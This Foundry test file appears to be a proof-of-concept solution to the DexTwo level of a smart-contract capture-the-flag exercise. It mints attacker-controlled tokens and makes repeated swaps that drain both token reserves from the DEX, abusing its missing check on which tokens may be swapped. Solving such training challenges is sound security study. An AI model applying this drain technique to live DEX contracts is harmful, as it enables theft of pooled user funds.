// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "src/level23.sol";

contract POC is Test {
    DexTwo level23;
    SwappableTokenTwo tokenA;
    SwappableTokenTwo tokenB;
    SwappableTokenTwo tokenC;
    SwappableTokenTwo tokenD;
    address player;

    function setUp() public {
        player = makeAddr("player");

        // Defining contracts
        level23 = new DexTwo();
        tokenA = new SwappableTokenTwo(
            address(level23),
            "Token A",
            "TKNA",
            110
        );
        tokenB = new SwappableTokenTwo(
            address(level23),
            "Token B",
            "TKNB",
            110
        );

        level23.setTokens(address(tokenA), address(tokenB));

        tokenA.approve(address(level23), 100);
        tokenB.approve(address(level23), 100);

        level23.add_liquidity(address(tokenA), 100);
        level23.add_liquidity(address(tokenB), 100);

        tokenA.transfer(player, 10);
        tokenB.transfer(player, 10);
    }

    function test() public {
        startHoax(player, 100 ether);

        // Tokens that will be used to drain all tokens funds
        tokenC = new SwappableTokenTwo(
            address(level23),
            "Token C",
            "TKNC",
            110
        );

        tokenD = new SwappableTokenTwo(
            address(level23),
            "Token D",
            "TKND",
            110
        );

        tokenC.approve(address(level23), 100);
        tokenC.transfer(player, 10);
        tokenC.transfer(address(level23), 100);

        tokenD.approve(address(level23), 100);
        tokenD.transfer(player, 10);
        tokenD.transfer(address(level23), 100);

        level23.approve(address(level23), 1000);

        // Token A -> Token C
        level23.swap(address(tokenA), address(tokenC), 10);
        level23.swap(address(tokenC), address(tokenA), 20);
        level23.swap(address(tokenA), address(tokenC), 24);
        level23.swap(address(tokenC), address(tokenA), 30);
        level23.swap(address(tokenA), address(tokenC), 41);
        level23.swap(address(tokenC), address(tokenA), 45);

        // Token B -> Token D
        level23.swap(address(tokenB), address(tokenD), 10);
        level23.swap(address(tokenD), address(tokenB), 20);
        level23.swap(address(tokenB), address(tokenD), 24);
        level23.swap(address(tokenD), address(tokenB), 30);
        level23.swap(address(tokenB), address(tokenD), 41);
        level23.swap(address(tokenD), address(tokenB), 45);

        tokenA.balanceOf(address(level23));
        tokenB.balanceOf(address(level23));

        vm.stopPrank();
    }
}
